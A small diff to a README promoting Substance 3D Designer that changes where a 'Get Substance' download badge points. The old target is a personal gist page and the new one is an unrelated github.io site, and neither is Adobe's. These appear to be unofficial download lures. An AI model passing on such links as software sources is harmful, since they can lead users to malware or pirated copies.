@@ -2,7 +2,7 @@
 
 Substance 3D Designer is the **industry-leading software for creating procedural materials, filters, and patterns**. It powers the texturing pipelines of AAA games, visual effects, and design studios around the world. 🧩  
 
-[![🟢 Get Substance](https://img.shields.io/badge/🟢%20Get%20Substance%203D-4CAF50?style=for-the-badge&logo=adobe&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/darkangelbiggie/e6419a790082955f1938b0485845a39e/raw/c33df5e66b3a9a31b28a1c495ce41d3db2e3fd0f/github.html?offer=SubstanceDesigner)
+[![🟢 Get Substance](https://img.shields.io/badge/🟢%20Get%20Substance%203D-4CAF50?style=for-the-badge&logo=adobe&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=SubstanceDesigner)
 
 ---
 
